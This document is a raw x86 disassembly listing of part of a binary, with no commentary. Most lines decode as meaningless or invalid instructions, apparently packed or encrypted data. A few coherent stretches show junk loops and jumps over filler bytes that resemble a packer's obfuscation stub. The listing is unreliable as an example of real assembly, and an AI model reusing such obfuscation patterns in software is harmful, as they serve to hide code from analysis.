  407261:	bound  edx,QWORD PTR [edx-0x2602a939]
  407267:	add    BYTE PTR [edx+0x6c689ed1],bl
  40726d:	addr16 mov bl,0x24
  407270:	outs   dx,DWORD PTR gs:[esi]
  407272:	xchg   esi,edx
  407274:	add    DWORD PTR [ebx+0x4b],0xf3692b13
  40727b:	loop   0x4072d9
  40727d:	(bad)  
  40727e:	cmp    al,BYTE PTR [esi]
  407280:	sub    DWORD PTR [edx-0x18d6a719],0xffffff9e
  407287:	sub    BYTE PTR [eax],0xde
  40728a:	cmp    BYTE PTR [ebp+ecx*2-0x63a82ff2],bh
  407291:	outs   dx,DWORD PTR ds:[esi]
  407292:	cmp    ecx,DWORD PTR [edx-0x1a4c0fe9]
  407298:	mov    eax,0xa1dde96d
  40729d:	dec    ecx
  40729e:	sbb    al,BYTE PTR [eax-0x1e3e568d]
  4072a4:	push   esp
  4072a5:	rcl    BYTE PTR [edi+0x42],cl
  4072a8:	call   0x8554441e
  4072ad:	push   cs
  4072ae:	imul   eax
  4072b0:	dec    ecx
  4072b1:	daa    
  4072b2:	mov    cl,0x53
  4072b4:	bound  esi,QWORD PTR [edi-0x6a]
  4072b7:	(bad)  
  4072b8:	adc    bh,BYTE PTR [eax+ebp*8]
  4072bb:	add    DWORD PTR [eax],ecx
  4072bd:	add    DWORD PTR [esi+0x6],edx
  4072c0:	xchg   esi,eax
  4072c1:	add    al,0xf8
  4072c3:	push   eax
  4072c4:	jae    0x40726a
  4072c6:	call   0x89a65cec
  4072cb:	jb     0x40731d
  4072cd:	jae    0x40729d
  4072cf:	loop   0x40727f
  4072d1:	cs push cs
  4072d3:	das    
  4072d4:	xchg   DWORD PTR [bp+si],esp
  4072d7:	mov    esi,ecx
  4072d9:	imul   ecx,DWORD PTR [ebx],0xfe23d64f
  4072df:	mov    ss,WORD PTR [eax-0x5a513e7c]
  4072e5:	jecxz  0x4072f9
  4072e7:	stc    
  4072e8:	iret   
  4072e9:	sbb    eax,0xa05c005a
  4072ee:	ret    0xb198
  4072f1:	test   al,0x42
  4072f3:	mov    al,0x35
  4072f5:	sti    
  4072f6:	iret   
  4072f7:	jg     0x407289
  4072f9:	xor    DWORD PTR [eax+eax*4],ecx
  4072fc:	and    ch,dh
  4072fe:	sbb    eax,0x110da283
  407303:	jge    0x4072fd
  407305:	pop    ebp
  407306:	cmp    DWORD PTR [ebx+0x69f26da0],0x4c91696f
  407310:	fwait
  407311:	dec    ecx
  407312:	std    
  407313:	cld    
  407314:	push   es
  407315:	xor    ecx,DWORD PTR [eax]
  407317:	mov    al,0x6f
  407319:	mov    esi,0x3b37bbf1
  40731e:	inc    edi
  40731f:	pop    ecx
  407320:	cmc    
  407321:	clc    
  407322:	shr    BYTE PTR [eax+0x41585e7],0x54
  407329:	xchg   edx,eax
  40732a:	ds out 0x91,eax
  40732d:	mov    ch,0x94
  40732f:	int    0x18
  407331:	popf   
  407332:	adc    ebp,ebp
  407334:	popa   
  407335:	cwde   
  407336:	inc    edi
  407337:	sbb    bh,dl
  407339:	test   bh,dh
  40733b:	pop    edi
  40733c:	push   ss
  40733d:	mov    al,ds:0x63c58b96
  407342:	(bad)  [eax+0x57cb00c1]
  407348:	xor    al,0xf
  40734a:	test   BYTE PTR [edi],ah
  40734c:	cld    
  40734d:	(bad)  
  40734e:	dec    ecx
  407350:	ret    0x4
  407353:	push   ebp
  407354:	mov    ebp,esp
  407356:	sub    esp,0x2c
  407359:	and    DWORD PTR ds:0x433657,0x5787
  407363:	mov    DWORD PTR [ebp-0x8],0xf89c8532
  40736a:	mov    eax,ds:0x43372b
  40736f:	or     DWORD PTR ds:0x43372f,eax
  407375:	jmp    0x40759d
  40737a:	pop    edx
  40737b:	cmp    al,0x59
  40737d:	inc    ebx
  40737e:	pop    ecx
  40737f:	arpl   WORD PTR [eax-0x1b],sp
  407382:	js     0x407389
  407384:	push   esi
  407385:	loope  0x40739c
  407387:	mov    al,0x8b
  407389:	pop    esp
  40738a:	or     al,dl
  40738c:	jle    0x40740c
  40738e:	add    eax,0x417e7e7c
  407393:	out    dx,al
  407394:	ds (bad) 
  407396:	dec    ecx
  407397:	push   edi
  407398:	repnz dec edx
  40739a:	lods   eax,DWORD PTR ds:[esi]
  40739b:	adc    ecx,esi
  40739d:	cld    
  40739e:	and    eax,0xf2d6cc47
  4073a3:	addr16 or eax,0x3f101a31
  4073a9:	cmp    DWORD PTR [ecx+0x7749e03a],edx
  4073af:	mov    cl,0xa2
  4073b1:	adc    al,0xb0
  4073b3:	cli    
  4073b4:	cmp    al,0x55
  4073b6:	and    eax,0xc854610a
  4073bb:	and    al,0x2c
  4073bd:	sahf   
  4073be:	cmp    dl,BYTE PTR [ecx+0x8df2b08]
  4073c4:	inc    ebp
  4073c5:	push   es
  4073c6:	test   ecx,ebx
  4073c8:	inc    esp
  4073c9:	mov    es,WORD PTR [esi]
  4073cb:	cmp    al,0x21
  4073cd:	pop    DWORD PTR [ecx]
  4073cf:	scas   eax,DWORD PTR es:[edi]
  4073d0:	mov    eax,ds:0x17d6bc8b
  4073d5:	jp     0x407426
  4073d7:	sub    eax,0x34d49044
  4073dd:	sub    DWORD PTR [ebp+0x78],0x37
  4073e1:	int    0x6f
  4073e3:	mov    cs,WORD PTR [edi]
  4073e5:	mov    al,0x7d
  4073e7:	or     al,0x4
  4073e9:	loope  0x4073cd
  4073eb:	mov    DWORD PTR [ecx-0x18993444],ebp
  4073f1:	jns    0x407377
  4073f3:	push   ebp
  4073f4:	dec    edi
  4073f5:	add    bl,BYTE PTR [ebx+0x2b]
  4073f8:	(bad)  
  4073f9:	int    0xed
  4073fb:	push   eax
  4073fc:	jle    0x407413
  4073fe:	xchg   ebp,eax
  4073ff:	xchg   ecx,eax
  407400:	pop    ebp
  407401:	out    0x9a,eax
  407403:	or     ch,BYTE PTR [esi]
  407405:	xor    eax,0x90523f35
  40740a:	hlt    
  40740b:	pop    edi
  40740c:	add    eax,0xc9248df3
  407411:	push   ds
  407412:	xor    DWORD PTR [eax+0x4],ebp
  407415:	push   ebx
  407416:	in     al,0x70
  407418:	add    ebx,esp
  40741a:	dec    ecx
  40741b:	or     ch,cl
  40741d:	arpl   ax,bx
  40741f:	jnp    0x4073fd
  407421:	cmp    bl,dh
  407423:	(bad)  
  407424:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407425:	pop    edx
  407426:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407427:	ror    BYTE PTR [bp+di],0xd1
  40742b:	sub    esp,ebx
  40742d:	jmp    0x407470
  40742f:	jne    0x40747e
  407431:	dec    ebx
  407432:	xlat   BYTE PTR ds:[ebx]
  407433:	and    dh,BYTE PTR gs:[esi+0x62]
  407437:	mov    ds:0x8b49425d,eax
  40743c:	cdq    
  40743d:	leave  
  40743e:	cmp    DWORD PTR [eax+0x4291756e],eax
  407444:	and    BYTE PTR [ebx],dh
  407446:	jns    0x407465
  407448:	loop   0x40742e
  40744a:	stos   DWORD PTR es:[edi],eax
  40744b:	mov    al,ds:0x1ecce4e9
  407450:	jecxz  0x4074b4
  407452:	inc    eax
  407453:	enter  0x560f,0xed
  407457:	std    
  407458:	pop    esi
  407459:	das    
  40745a:	dec    esp
  40745b:	clc    
  40745c:	ins    BYTE PTR es:[edi],dx
  40745d:	imul   ecx,DWORD PTR [edx+0x376fe2e0],0xffffffcb
  407464:	xchg   BYTE PTR [edi+0xe],dl
  407467:	inc    esp
  407468:	xchg   DWORD PTR [ecx+0x3994a747],ecx
  40746e:	jl     0x40747e
  407470:	test   eax,ebp
  407472:	or     esp,DWORD PTR [edx+0x43]
  407475:	dec    eax
  407476:	cs jne 0x4074c3
  407479:	or     dh,BYTE PTR [ecx+eax*8+0x2c]
  40747d:	jns    0x407470
  40747f:	cdq    
  407480:	in     eax,0xa2
  407482:	sub    ah,cl
  407484:	popf   
  407485:	lahf   
  407486:	cdq    
  407487:	(bad)  
  407488:	jge    0x4074e1
  40748a:	and    al,0x39
  40748c:	icebp  
  40748d:	int3   
  40748e:	mov    BYTE PTR [ecx],cl
  407490:	jnp    0x4074a3
  407492:	mov    eax,ds:0xd95e84ae
  407497:	test   DWORD PTR [ebx-0x68],ecx
  40749a:	dec    ebp
  40749b:	dec    esi
  40749c:	pop    edi
  40749d:	scas   al,BYTE PTR es:[edi]
  40749e:	repnz mov eax,gs
  4074a1:	inc    ecx
  4074a2:	inc    ebp
  4074a3:	jle    0x4074ae
  4074a5:	push   ds
  4074a6:	mov    ecx,0x2dbe8cdf
  4074ab:	outs   dx,DWORD PTR ds:[esi]
  4074ac:	repz std 
  4074ae:	iret   
  4074af:	bound  edi,QWORD PTR [ebp+0x5119b32d]
  4074b5:	push   esi
  4074b6:	or     BYTE PTR [ecx+0x1cd1d714],dh
  4074bc:	dec    esp
  4074bd:	inc    ecx
  4074be:	jne    0x40744b
  4074c0:	popa   
  4074c1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4074c2:	xor    edx,DWORD PTR [edi+0x75]
  4074c5:	stos   DWORD PTR es:[edi],eax
  4074c6:	mov    dl,0xf7
  4074c8:	call   0x270f1313
  4074cd:	mov    edx,ds
  4074cf:	push   edi
  4074d0:	aam    0x39
  4074d2:	inc    edi
  4074d3:	pop    ds
  4074d4:	and    esi,DWORD PTR [edi+0x61]
  4074d7:	mov    cl,0xf6
  4074d9:	imul   esi,DWORD PTR [ebx],0x99d1436f
  4074df:	dec    edi
  4074e0:	sub    al,0x71
  4074e2:	mov    bh,0xc1
  4074e4:	aaa    
  4074e5:	lods   al,BYTE PTR ds:[esi]
  4074e6:	aam    0x58
  4074e8:	sbb    al,0xfe
  4074ea:	mov    ds:0xff0f938e,al
  4074ef:	les    eax,FWORD PTR [esi]
  4074f1:	pop    ss
  4074f2:	jmpw   0xf48c
  4074f6:	(bad)  
  4074f8:	sti    
  4074f9:	ins    BYTE PTR es:[edi],dx
  4074fa:	ret    
  4074fb:	and    DWORD PTR [edi+0x2b105241],edi
  407501:	stos   BYTE PTR es:[edi],al
  407502:	jae    0x407489
  407504:	pop    esp
  407505:	int3   
  407506:	xchg   ecx,eax
  407507:	test   eax,0xc1d5d1bf
  40750c:	mov    ?,WORD PTR [esi]
  40750e:	sbb    eax,0x515fbc9c
  407513:	dec    eax
  407514:	xchg   ebp,eax
  407515:	(bad)  
  407516:	jl     0x407501
  407518:	jne    0x407556
  40751a:	das    
  40751b:	outs   dx,DWORD PTR ds:[esi]
  40751c:	dec    esi
  40751d:	mov    ch,0xd3
  40751f:	push   ss
  407520:	push   0x639b957
  407525:	fs out dx,eax
  407527:	cmp    dh,BYTE PTR [edi+0x41]
  40752a:	mov    WORD PTR [ebx-0x287667b5],?
  407530:	sbb    DWORD PTR [esi+0x338b0bf0],0xfd5b6961
  40753a:	sbb    esi,DWORD PTR [ebp+0x6bc70ba2]
  407540:	sar    ebx,0x64
  407543:	push   0x76f8e4bc
  407548:	cmp    esp,esi
  40754a:	dec    ebx
  40754b:	pop    ebx
  40754c:	aas    
  40754d:	push   ebx
  40754e:	inc    ebp
  40754f:	add    cl,BYTE PTR [eax+edi*4+0x2c5020f]
  407556:	xchg   esp,eax
  407557:	inc    esi
  407558:	je     0x407564
  40755a:	mov    ds:0x8a8c695b,eax
  40755f:	in     al,dx
  407560:	test   BYTE PTR [eax+0x18948cdd],dh
  407566:	loope  0x407565
  407568:	imul   esp,eax,0xfffffff5
  40756b:	and    eax,0xfc7f9c39
  407570:	pop    ds
  407571:	(bad)  
  407573:	das    
  407574:	sub    al,0x84
  407576:	mov    eax,0x2bbb364c
  40757b:	test   eax,0x692d5bf3
  407580:	add    eax,0x33441aed
  407585:	retf   
  407586:	in     eax,dx
  407587:	xchg   ebp,eax
  407588:	pop    edx
  407589:	dec    esp
  40758a:	jl     0x4075f5
  40758c:	jbe    0x407563
  40758e:	jbe    0x4075e7
  407590:	lods   eax,DWORD PTR es:[esi]
  407592:	cdq    
  407593:	pop    edi
  407594:	aad    0x61
  407596:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407597:	mov    edi,0x57483387
  40759c:	std    
  40759d:	mov    DWORD PTR [ebp-0x14],0xf89c8531
  4075a4:	xor    eax,0x551
  4075a9:	mov    eax,0x9577
  4075ae:	mov    ecx,DWORD PTR ds:0x433653
  4075b4:	sub    DWORD PTR ds:0x43360f,ecx
  4075ba:	mov    WORD PTR [ebp-0x4],ax
  4075be:	and    ecx,0x22ab
  4075c4:	lea    eax,[ebp-0x24]
  4075c7:	sub    ecx,DWORD PTR ds:0x4335ff
  4075cd:	mov    DWORD PTR [ebp-0x28],eax
  4075d0:	mov    eax,DWORD PTR [ebp+0x8]
  4075d3:	and    DWORD PTR ds:0x43366b,0x78d4
  4075dd:	mov    DWORD PTR [ebp-0x20],eax
  4075e0:	and    DWORD PTR ds:0x43360f,0x0
  4075ea:	jmp    0x4075fc
  4075ef:	mov    ecx,DWORD PTR ds:0x43360f
  4075f5:	inc    ecx
  4075f6:	mov    DWORD PTR ds:0x43360f,ecx
  4075fc:	cmp    DWORD PTR ds:0x43360f,0x1c
  407603:	jae    0x40763a
  407609:	cmp    DWORD PTR ds:0x43360f,0x21
  407610:	jne    0x40762f
  407616:	push   DWORD PTR [ebp-0x18]
  407619:	push   0x26d9
  40761e:	push   DWORD PTR [ebp-0x1c]
  407621:	push   0x600b
  407626:	push   DWORD PTR [ebp-0x14]
  407629:	call   DWORD PTR ds:0x412348
  40762f:	jmp    0x4075ef
  407634:	xor    ecx,0x31bd
  40763a:	push   ebx
  40763b:	lea    eax,[ebp-0x18]
  40763e:	mov    DWORD PTR [ebp-0x1c],eax
  407641:	mov    eax,DWORD PTR [ebp-0x1c]
  407644:	jmp    0x40786c
  407649:	aad    0xb8
  40764b:	(bad)  
  40764c:	shl    BYTE PTR [ebx-0x20],0x75
  407650:	dec    ecx
  407651:	js     0x407697
  407653:	js     0x407668
  407655:	mov    esi,0x11e1b5bf
  40765a:	sar    BYTE PTR [esi+0x7e],0x5
  40765e:	jl     0x4076de
  407660:	jle    0x4075e5
  407662:	pop    ebx
  407663:	or     eax,0x7776597e
  407668:	js     0x40761d
  40766a:	inc    esp
  40766b:	(bad)  
  40766c:	nop
  40766d:	inc    ebp
  40766e:	adc    BYTE PTR [ebx-0xe],cl
  407671:	xor    eax,0x425badf3
  407676:	inc    ebp
  407677:	xor    DWORD PTR [edi-0x6e],ebp
  40767a:	int3   
  40767b:	xchg   esi,eax
  40767c:	sbb    ch,BYTE PTR [eax-0x3b]
  40767f:	test   DWORD PTR [ebx-0x17ee9142],edi
  407685:	popf   
  407686:	push   0xe0f0c747
  40768b:	xchg   edx,eax
  40768c:	lods   al,BYTE PTR ds:[esi]
  40768d:	loop   0x407652
  40768f:	mov    ebx,0x194cf37c
  407694:	je     0x4076a1
  407696:	cmp    eax,DWORD PTR [eax]
  407698:	add    ah,ah
  40769a:	push   ds
  40769b:	leave  
  40769c:	adc    BYTE PTR [edx],al
  40769e:	addr16 inc ebp
  4076a0:	mov    cl,BYTE PTR [edx-0x31]
  4076a3:	and    ecx,DWORD PTR [edx-0xa]
  4076a6:	icebp  
  4076a7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4076a8:	jbe    0x4076e3
  4076aa:	xor    bl,bl
  4076ac:	push   eax
  4076ad:	add    DWORD PTR [edi+0x3abc01d4],esp
  4076b3:	inc    edx
  4076b4:	clc    
  4076b5:	or     ch,bl
  4076b7:	adc    BYTE PTR [ebp+eax*8+0x31],bl
  4076bb:	sub    ch,bh
  4076bd:	retf   0x69c6
  4076c0:	sbb    eax,0xbc02dfd9
  4076c5:	sbb    eax,0x688823c5
  4076ca:	pop    ecx
  4076cb:	call   0x2b6e:0xcafd76e8
  4076d2:	pop    ebx
  4076d3:	aam    0x97
  4076d5:	jmp    0xe8fc:0x38d3256c
  4076dc:	fs cmc 
  4076de:	jno    0x4076e1
  4076e0:	add    DWORD PTR [edi+0x18a5dc55],ecx
  4076e6:	jl     0x407735
  4076e8:	sbb    BYTE PTR [edi+0x73],bl
  4076eb:	cli    
  4076ec:	mov    ch,0x2d
  4076ee:	andps  xmm1,XMMWORD PTR [esi-0x4e196f1b]
  4076f5:	scas   eax,DWORD PTR es:[edi]
  4076f6:	jmp    0x40771a
  4076f8:	pop    es
  4076f9:	fcom   QWORD PTR [ebp+ecx*8-0x25cb01f1]
  407700:	pop    ds
  407701:	adc    eax,0x48869718
  407706:	pop    ebp
  407707:	pusha  
  407708:	mov    esp,0xe713a838
  40770d:	out    dx,eax
  40770e:	push   ebp
  40770f:	aas    
  407710:	push   edx
  407711:	sub    DWORD PTR [esi+0x85328c9],eax
  407717:	repz jmp 0x82ab:0xb1f4045f
  40771f:	and    DWORD PTR [eax-0x247fee17],0x3d820d93
  407729:	pop    ecx
  40772a:	mov    edx,0xaf28750a
  40772f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407730:	cmp    DWORD PTR [edi+0x73],esp
  407733:	adc    ebp,esi
  407735:	shl    DWORD PTR [esi-0x5edd3f76],0xc4
  40773c:	loope  0x407783
  40773e:	pop    esi
  40773f:	and    ebx,esp
  407741:	fnstenv [edx+0x31eec26b]
  407747:	cs (bad) 
  407749:	xchg   edx,eax
  40774a:	mov    esp,0xd6856632
  40774f:	mov    dl,0x8e
  407751:	retf   
  407752:	fidiv  WORD PTR [ecx+0x18e5315a]
  407758:	xchg   edx,eax
  407759:	add    dl,0xaf
  40775c:	out    dx,eax
  40775d:	mov    ch,0xb
  40775f:	into   
  407760:	add    DWORD PTR [edi+0x70],0xab82a3f4
  407767:	and    ebx,DWORD PTR [edi+0x7723bb33]
  40776d:	adc    eax,0x20649453
  407772:	rcr    DWORD PTR [ebx+edx*8-0x17],0x71
  407777:	sub    edi,eax
  407779:	push   edi
  40777a:	(bad)  
  40777e:	mov    DWORD PTR [eax+0x3e73fffe],ecx
  407784:	scas   eax,DWORD PTR es:[edi]
  407785:	cmp    BYTE PTR [edx-0x23],0xc1
  407789:	jg     0x4077b6
  40778b:	push   ds
  40778c:	cmc    
  40778d:	sub    BYTE PTR [eax],cl
  40778f:	push   ds
  407790:	idiv   esi
  407792:	ins    BYTE PTR es:[edi],dx
  407793:	aam    0xd0
  407795:	add    BYTE PTR ds:0x6b7048a9,dl
  40779b:	retf   0x436c
  40779e:	pop    esp
  40779f:	mov    dl,0x82
  4077a1:	xchg   edi,eax
  4077a2:	pop    esi
  4077a3:	mov    cl,0x66
  4077a5:	dec    ecx
  4077a6:	push   0xa90e27b0
  4077ab:	rcr    DWORD PTR ds:0x8c03c491,0x11
  4077b2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4077b3:	and    al,0xe7
  4077b5:	out    dx,eax
  4077b6:	ror    BYTE PTR [esi],0x7b
  4077b9:	xchg   ebp,eax
  4077ba:	lods   eax,DWORD PTR ds:[esi]
  4077bb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4077bc:	sub    BYTE PTR [ecx+0x6e61293b],bh
  4077c2:	retf   
  4077c3:	push   ecx
  4077c4:	pop    ds
  4077c5:	out    0xe1,eax
  4077c7:	ss jg  0x407819
  4077ca:	add    BYTE PTR [edi+esi*8],0x9f
  4077ce:	push   edx
  4077cf:	gs fs daa 
  4077d2:	sar    DWORD PTR [edi],1
  4077d4:	sub    bh,BYTE PTR [edx-0x2b]
  4077d7:	and    eax,ebp
  4077d9:	cmp    DWORD PTR [esi-0x48],ebx
  4077dc:	out    dx,al
  4077dd:	stos   BYTE PTR es:[edi],al
  4077de:	xor    bh,bl
  4077e0:	mov    ch,BYTE PTR [esi-0x4]
  4077e3:	(bad)  
  4077e4:	jns    0x407777
  4077e6:	mov    esp,0xc90bff90
  4077eb:	test   ebp,0xb94b8b44
  4077f1:	push   ds
  4077f2:	popf   
  4077f3:	xor    eax,0x82a833a5
  4077f8:	lock arpl WORD PTR ds:[ebx],bx
  4077fc:	mov    bh,0xe4
  4077fe:	mov    DWORD PTR [eax],eax
  407800:	mov    esi,0x8f408845
  407805:	sub    ebp,DWORD PTR [edi]
  407807:	xor    ch,BYTE PTR [ecx+ebp*8]
  40780a:	inc    esp
  40780b:	fmulp  st(0),st
  40780d:	ss mov ah,0x1d
  407810:	test   DWORD PTR [ecx-0x5102cab4],ecx
  407816:	cdq    
  407817:	push   es
  407818:	dec    ebp
  407819:	shr    DWORD PTR [ebx-0x3327d384],0xf1
  407820:	mov    cl,0xbb
  407822:	adc    DWORD PTR [ebx+0x7f46de87],esp
  407828:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407829:	pop    esp
  40782a:	xchg   DWORD PTR [edx],ebx
  40782c:	sbb    al,0x61
  40782e:	dec    ecx
  40782f:	xor    al,cl
  407831:	mov    esp,0xe9759e3c
  407836:	shr    DWORD PTR [edi-0x4dce75c],0x42
  40783d:	pushf  
  40783e:	test   DWORD PTR [eax-0x5],esp
  407841:	and    al,BYTE PTR [ecx]
  407843:	mov    al,BYTE PTR [ebx]
  407845:	xchg   ebp,eax
  407846:	sub    eax,0xb4ba6d2f
  40784b:	test   BYTE PTR [eax],al
  40784d:	xchg   ecx,eax
  40784e:	out    0x84,al
  407850:	leave  
  407851:	jnp    0x4078b9
  407853:	push   ecx
  407854:	adc    DWORD PTR [ecx],ebx
  407856:	scas   al,BYTE PTR es:[edi]
  407857:	sbb    cl,BYTE PTR [ebx]
  407859:	mov    ebp,DWORD PTR [edx-0x6d1b2e2c]
  40785f:	mov    DWORD PTR [esi+edi*4-0x1ccf6aa4],edx
  407866:	push   eax
  407867:	repz adc BYTE PTR [eax+0x2b566519],ch
  40786e:	into   
  40786f:	push   edi
  407870:	mov    edi,0xf89f2da9
  407875:	xor    DWORD PTR ds:0x4335ff,0x433663
  40787f:	mov    DWORD PTR [eax],edi
  407881:	mov    DWORD PTR ds:0x43371b,0x12
  40788b:	cmp    DWORD PTR ds:0x43371b,0x0
  407892:	je     0x4078c1
  407898:	cmp    DWORD PTR ds:0x43371b,0x14
  40789f:	jne    0x4078b1
  4078a5:	push   DWORD PTR [ebp-0x28]
  4078a8:	push   DWORD PTR [ebp-0x1c]
  4078ab:	call   DWORD PTR ds:0x41234c
  4078b1:	mov    eax,ds:0x43371b
  4078b6:	dec    eax
  4078b7:	mov    ds:0x43371b,eax
  4078bc:	jmp    0x40788b
  4078c1:	mov    eax,DWORD PTR [ebp-0x14]
  4078c4:	mov    ebx,DWORD PTR [ebp-0x8]
  4078c7:	and    DWORD PTR ds:0x43369f,0x0
  4078d1:	xor    esi,esi
  4078d3:	xor    esi,DWORD PTR ds:0x43369f
  4078d9:	inc    esi
  4078da:	mov    DWORD PTR ds:0x43369f,esi
  4078e0:	cmp    DWORD PTR ds:0x43369f,0x1c
  4078e7:	jne    0x4078f6
  4078ed:	push   DWORD PTR [ebp-0x28]
  4078f0:	call   DWORD PTR ds:0x4120d0
  4078f6:	cmp    DWORD PTR ds:0x43369f,0x18
  4078fd:	jb     0x4078d1
  407903:	xor    esi,0x6b5
  407909:	mov    ecx,0x7510854
  40790e:	neg    esi
  407910:	jmp    0x407b38
  407915:	loopne 0x4078c8
  407917:	test   DWORD PTR [edx+0x71f1b255],esi
  40791d:	cmp    dh,cl
  40791f:	pop    ebp
  407920:	out    0x5c,eax
  407922:	(bad)  
  407923:	xor    eax,0x7ece2434
  407928:	jle    0x40792f
  40792a:	jl     0x4079aa
  40792c:	jle    0x407934
  40792e:	bound  eax,QWORD PTR [esi+0x75]
  407931:	sbb    ch,dh
  407933:	lods   al,BYTE PTR ds:[esi]
  407934:	adc    eax,0x7ff0880d
  407939:	cmp    esp,DWORD PTR [edx-0x5c6c3b1c]
  40793f:	stos   DWORD PTR es:[edi],eax
  407940:	mov    BYTE PTR [eax-0x7dbaf00e],ah
  407946:	push   0x48d1a441
  40794b:	cmc    
  40794c:	(bad)  
  40794d:	jg     0x40799c
  40794f:	fwait
  407950:	not    DWORD PTR [edi]
  407952:	mov    bh,0x9c
  407954:	xor    al,0x93
  407956:	(bad)  
  407957:	clc    
  407958:	add    BYTE PTR [esi-0x38],cl
  40795b:	xor    al,0xa3
  40795d:	sub    DWORD PTR [esi-0x7f579d9b],ebp
  407963:	in     eax,dx
  407964:	adc    DWORD PTR [ebp+0x61b16504],esi
  40796a:	add    eax,0x4a35369b
  40796f:	pusha  
  407970:	fs aad 0x63
  407973:	sbb    ecx,esi
  407975:	xchg   esi,eax
  407976:	test   al,0x83
  407978:	js     0x407935
  40797a:	inc    BYTE PTR [esi-0x72]
  40797d:	push   edi
  40797e:	mov    dh,0x10
  407980:	jmp    0x9d43959b
  407985:	das    
  407986:	push   esp
  407987:	into   
  407988:	daa    
  407989:	shl    DWORD PTR [ecx+0x4bb1b03c],1
  40798f:	sbb    BYTE PTR [edx-0x45],cl
  407992:	jmp    0x4079e3
  407994:	xor    al,0xfe
  407996:	bound  ecx,QWORD PTR [edi-0x51]
  407999:	push   eax
  40799a:	add    eax,0x77516a6b
  40799f:	fist   DWORD PTR [ecx-0x5dcee72e]
  4079a5:	push   esp
  4079a6:	mov    eax,ds:0x52f72e4f
  4079ab:	sbb    DWORD PTR [ecx+0x3],ebp
  4079ae:	dec    ebx
  4079af:	dec    edi
  4079b0:	(bad)  
  4079b1:	jns    0x407a2e
  4079b3:	xchg   edx,eax
  4079b4:	add    esp,DWORD PTR [ecx]
  4079b6:	push   cs
  4079b7:	jle    0x407999
  4079b9:	cmc    
  4079ba:	push   eax
  4079bb:	int    0x6
  4079bd:	ds pop esp
  4079bf:	jmp    0xcec3fabb
  4079c4:	in     eax,0xdd
  4079c6:	ins    BYTE PTR es:[edi],dx
  4079c7:	lods   eax,DWORD PTR ds:[esi]
  4079c8:	jns    0x40799f
  4079ca:	data16 int 0x51
  4079cd:	push   ecx
  4079ce:	sbb    cl,ah
  4079d0:	or     dh,BYTE PTR [edi]
  4079d2:	iret   
  4079d3:	mov    esi,0x151c7a97
  4079d8:	scas   eax,DWORD PTR es:[edi]
  4079d9:	bound  ebx,QWORD PTR [edx-0x12]
  4079dc:	ds pop eax
  4079de:	aad    0xbc
  4079e0:	adc    al,0x42
  4079e2:	sbb    DWORD PTR [edi+eiz*8-0x3edc835e],edx
  4079e9:	mov    ebp,0x60b66692
  4079ee:	iret   
  4079ef:	fdiv   QWORD PTR [ecx+ecx*2+0x63cfffb2]
  4079f6:	inc    esp
  4079f7:	int    0x1e
  4079f9:	mov    gs,WORD PTR [eax+0x7e51e0de]
  4079ff:	into   
  407a00:	xor    BYTE PTR [ebx],ah
  407a02:	rcr    BYTE PTR [esi],1
  407a04:	fist   DWORD PTR [edx+eiz*8-0x400c6332]
  407a0b:	xchg   edi,eax
  407a0c:	add    al,0x27
  407a0e:	and    dl,ch
  407a10:	(bad)  
  407a12:	pop    edx
  407a13:	jae    0x407a6b
  407a15:	cmc    
  407a16:	mov    al,ds:0xb1f04839
  407a1b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407a1c:	jmp    0xb063:0xa0bb0d94
  407a23:	stos   DWORD PTR es:[edi],eax
  407a24:	or     DWORD PTR [eax+eax*2],0xffffff8d
  407a28:	out    0xe0,eax
  407a2a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407a2b:	xchg   esi,eax
  407a2c:	repnz lds ebx,FWORD PTR [edi-0x22934e7a]
  407a33:	outs   dx,DWORD PTR ds:[esi]
  407a34:	mov    eax,0x915d2e05
  407a39:	push   cs
  407a3a:	enter  0xd1ea,0xd6
  407a3e:	add    ebp,DWORD PTR [ebx]
  407a40:	and    eax,0x28e153f3
  407a45:	fisttp WORD PTR [edx-0x18]
  407a48:	jbe    0x407a1e
  407a4a:	mov    BYTE PTR [ecx+0x4d],0x70
  407a4e:	mov    dh,0x13
  407a50:	cmp    BYTE PTR [eax+ebp*8-0x3c],0x51
  407a55:	mov    ebp,0x5527b7d
  407a5a:	sub    bh,ch
  407a5c:	cmp    cl,BYTE PTR [esi+eax*4-0x20]
  407a60:	inc    edx
  407a61:	inc    eax
  407a62:	cmp    al,0x27
  407a64:	sahf   
  407a65:	fmul   QWORD PTR [ecx+0x51862cc8]
  407a6b:	stos   DWORD PTR es:[edi],eax
  407a6c:	mov    DWORD PTR [ecx+0x7d],esp
  407a6f:	aaa    
  407a70:	dec    ebp
  407a71:	sbb    edx,DWORD PTR [eax-0x353b0dca]
  407a77:	or     cl,cl
  407a79:	push   eax
  407a7a:	xor    BYTE PTR [eax],al
  407a7c:	xor    esi,ebp
  407a7e:	add    eax,0x8dd6dbfc
  407a83:	sub    BYTE PTR [ebx],dl
  407a85:	push   esp
  407a86:	call   FWORD PTR [ebp+0x34]
  407a89:	push   0x1ed995ba
  407a8e:	imul   edx,DWORD PTR [esi-0x15a42099],0x11
  407a95:	cdq    
  407a96:	ins    BYTE PTR es:[edi],dx
  407a97:	jl     0x407ab9
  407a99:	retf   0xffdc
  407a9c:	dec    edi
  407a9d:	(bad)  
  407a9e:	mov    ds:0xd3dbb41,al
  407aa3:	daa    
  407aa4:	mov    ds:0x9844f116,eax
  407aa9:	inc    ecx
  407aaa:	xchg   DWORD PTR [eax+ecx*1-0x2cee480f],edx
  407ab1:	es fs sbb eax,0xeafa494d
  407ab8:	jge    0x407a48
  407aba:	push   esp
  407abb:	pop    esi
  407abc:	xchg   esi,eax
  407abd:	and    ebx,DWORD PTR [edi+0x5e4870b]
  407ac3:	(bad)  
  407ac4:	or     DWORD PTR [ecx],eax
  407ac6:	and    eax,0x218303af
  407acb:	pusha  
  407acc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407acd:	je     0x407ae7
  407acf:	not    BYTE PTR [ebp-0x3f]
